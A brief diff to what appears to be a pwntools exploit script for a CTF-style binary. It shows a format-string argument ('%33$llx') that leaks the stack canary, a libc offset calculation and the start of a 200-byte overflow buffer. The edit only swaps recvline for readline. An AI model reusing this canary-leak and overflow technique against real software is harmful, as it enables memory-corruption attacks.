@@ -13,7 +13,7 @@ _exit = libc_base_address + 0x46a70
 print("[+] Spawning process...")
 
 io = process([exe.path, "%33$llx"])
-canary = int(io.recvline().strip(),16)
+canary = int(io.readline().strip(),16)
 print("[+] Canary leaked:{}".format(hex(canary)))
 
 buf = b'A' * 200
